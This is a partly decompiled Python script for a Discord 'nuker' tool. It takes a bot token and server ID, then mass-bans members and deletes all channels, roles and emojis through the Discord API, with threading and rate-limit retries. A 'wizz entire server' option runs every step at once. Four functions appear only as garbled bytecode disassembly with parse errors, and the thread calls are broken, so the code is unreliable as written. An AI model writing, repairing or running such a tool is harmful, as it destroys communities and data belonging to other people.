import requests, os, threading, time
from colorama import Fore, Style
members = open('members.txt')
channels = open('channels.txt')
roles = open('roles.txt')
emojis = open('emojis.txt')
token = input('Bot Token: ')
guild = input('Server ID: ')
os.system('cls')
headers = {'Authorization': 'Bot ' + token}

def ban--- This code section failed: ---

 L.  15         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                put
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_GLOBAL              guild
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/bans/'
               12  LOAD_FAST                'i'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L.  16        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  COMPARE_OP               in
               34  POP_JUMP_IF_FALSE    84  'to 84'

 L.  17        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          

 L.  18        54  LOAD_GLOBAL              print
               56  LOAD_STR                 'Got ratelimited, retrying after:  '
               58  LOAD_FAST                'r'
               60  LOAD_METHOD              json
               62  CALL_METHOD_0         0  ''
               64  LOAD_STR                 'retry_after'
               66  BINARY_SUBSCR    
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 ' s.'
               72  BUILD_STRING_3        3 
               74  CALL_FUNCTION_1       1  ''
               76  POP_TOP          
               78  JUMP_BACK             0  'to 0'

 L.  20        80  BREAK_LOOP           84  'to 84'
               82  JUMP_BACK             0  'to 0'
             84_0  COME_FROM            34  '34'

Parse error at or near `JUMP_BACK' instruction at offset 82


def channel_delete--- This code section failed: ---

 L.  23         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/channels/'
                6  LOAD_FAST                'u'
                8  FORMAT_VALUE          0  ''
               10  BUILD_STRING_2        2 
               12  LOAD_GLOBAL              headers
               14  LOAD_CONST               ('headers',)
               16  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               18  STORE_FAST               'r'

 L.  24        20  LOAD_STR                 'retry_after'
               22  LOAD_FAST                'r'
               24  LOAD_ATTR                text
               26  COMPARE_OP               in
               28  POP_JUMP_IF_FALSE    78  'to 78'

 L.  25        30  LOAD_GLOBAL              time
               32  LOAD_METHOD              sleep
               34  LOAD_FAST                'r'
               36  LOAD_METHOD              json
               38  CALL_METHOD_0         0  ''
               40  LOAD_STR                 'retry_after'
               42  BINARY_SUBSCR    
               44  CALL_METHOD_1         1  ''
               46  POP_TOP          

 L.  26        48  LOAD_GLOBAL              print
               50  LOAD_STR                 'Got ratelimited, retrying after: '
               52  LOAD_FAST                'r'
               54  LOAD_METHOD              json
               56  CALL_METHOD_0         0  ''
               58  LOAD_STR                 'retry_after'
               60  BINARY_SUBSCR    
               62  FORMAT_VALUE          0  ''
               64  LOAD_STR                 ' s.'
               66  BUILD_STRING_3        3 
               68  CALL_FUNCTION_1       1  ''
               70  POP_TOP          
               72  JUMP_BACK             0  'to 0'

 L.  28        74  BREAK_LOOP           78  'to 78'
               76  JUMP_BACK             0  'to 0'
             78_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 76


def role--- This code section failed: ---

 L.  31         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_GLOBAL              guild
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/roles/'
               12  LOAD_FAST                'k'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L.  32        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  COMPARE_OP               in
               34  POP_JUMP_IF_FALSE    84  'to 84'

 L.  33        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          

 L.  34        54  LOAD_GLOBAL              print
               56  LOAD_STR                 'Got ratelimited, retrying after: '
               58  LOAD_FAST                'r'
               60  LOAD_METHOD              json
               62  CALL_METHOD_0         0  ''
               64  LOAD_STR                 'retry_after'
               66  BINARY_SUBSCR    
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 ' s.'
               72  BUILD_STRING_3        3 
               74  CALL_FUNCTION_1       1  ''
               76  POP_TOP          
               78  JUMP_BACK             0  'to 0'

 L.  36        80  BREAK_LOOP           84  'to 84'
               82  JUMP_BACK             0  'to 0'
             84_0  COME_FROM            34  '34'

Parse error at or near `JUMP_BACK' instruction at offset 82


def emoji--- This code section failed: ---

 L.  39         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_GLOBAL              guild
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/emojis/'
               12  LOAD_FAST                'a'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L.  40        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  COMPARE_OP               in
               34  POP_JUMP_IF_FALSE    84  'to 84'

 L.  41        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          

 L.  42        54  LOAD_GLOBAL              print
               56  LOAD_STR                 'Got ratelimited, retrying after: '
               58  LOAD_FAST                'r'
               60  LOAD_METHOD              json
               62  CALL_METHOD_0         0  ''
               64  LOAD_STR                 'retry_after'
               66  BINARY_SUBSCR    
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 ' s.'
               72  BUILD_STRING_3        3 
               74  CALL_FUNCTION_1       1  ''
               76  POP_TOP          
               78  JUMP_BACK             0  'to 0'

 L.  44        80  BREAK_LOOP           84  'to 84'
               82  JUMP_BACK             0  'to 0'
             84_0  COME_FROM            34  '34'

Parse error at or near `JUMP_BACK' instruction at offset 82


def banall():
    for m in members:
        x = threading.Thread(target=ban, args=(m,))
        x.start


def channelsdel():
    for c in channels:
        y = threading.Thread(target=channel_delete, args=(c,))
        y.start


def rolesdel():
    for r in roles:
        z = threading.Thread(target=role, args=(r,))
        z.start


def emojisdel():
    for e in emojis:
        h = threading.Thread(target=emoji, args=(e,))
        h.start


print(Fore.BLUE + '\n                oooo    oooo   .oooooo.   ooooooooo.   oooooooooooo \n                `888   .8P\'   d8P\'  `Y8b  `888   `Y88. `888\'     `8 \n                 888  d8\'    888      888  888   .d88\'  888         \n                 88888[      888      888  888ooo88P\'   888oooo8    \n                 888`88b.    888      888  888          888    "    \n                 888  `88b.  `88b    d88\'  888          888       o \n                o888o  o888o  `Y8bood8P\'  o888o        o888ooooood8\n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                                 Made by > Kope\n                                \n                    1·· BAN ALL \n                        \n                        2·· PURGE CHANNELS \n                               \n                                3·· PURGE ROLES  \n                                    \n                                    4·· PURGE EMOJIS\n                                        \n                                        5·· WIZZ ENTIRE SERVER           \n' + Style.RESET_ALL)
while True:
    x = input('Choice: ')
    if x == '1':
        banall()
        print('Banning Members.')
    elif x == '2':
        channelsdel()
        print('Deleting Channels.')
    elif x == '3':
        rolesdel()
        print('Deleting Roles.')
    elif x == '4':
        emojisdel()
        print('Deleting Emojis.')
    elif x == '5':
        banall()
        print('Banning Members.')
        channelsdel()
        print('Deleting Channels.')
        rolesdel()
        print('Deleting Roles.')
        emojisdel()
        print('Deleting Emojis.')
        print('Server is now wizzed! Thanks for using my nuker.')